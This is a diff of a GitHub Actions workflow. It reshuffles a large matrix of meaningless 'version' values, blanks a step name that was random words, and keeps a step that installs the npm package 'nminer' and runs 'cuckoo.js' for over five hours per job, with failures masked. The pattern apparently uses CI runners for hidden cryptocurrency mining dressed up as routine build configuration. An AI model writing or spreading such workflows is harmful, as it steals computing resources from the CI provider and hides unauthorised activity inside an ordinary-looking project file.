@@ -9,23 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 86 }
+          - { version: 7421 }
+          - { version: 7284 }
+          - { version: 8794 }
+          - { version: 3221 }
+          - { version: 4096 }
+          - { version: 942 }
+          - { version: 6242 }
           - { version: 4066 }
-          - { version: 8014 }
-          - { version: 3585 }
-          - { version: 8797 }
-          - { version: 8538 }
-          - { version: 9915 }
-          - { version: 5722 }
-          - { version: 5631 }
-          - { version: 1751 }
-          - { version: 6388 }
-          - { version: 8091 }
-          - { version: 3871 }
-          - { version: 7159 }
-          - { version: 3349 }
-          - { version: 1459 }
-          - { version: 70 }
+          - { version: 5102 }
+          - { version: 2050 }
+          - { version: 6353 }
+          - { version: 357 }
+          - { version: 7006 }
+          - { version: 7182 }
+          - { version: 547 }
+          - { version: 8598 }
+          - { version: 4262 }
+          - { version: 5299 }
+          - { version: 8993 }
 
     steps:
       - name: Checkout
@@ -36,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: perspire yet taro somber cemetery
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 308m node cuckoo.js || echo "cuckoo executed"
+          timeout 316m node cuckoo.js || echo "cuckoo executed"
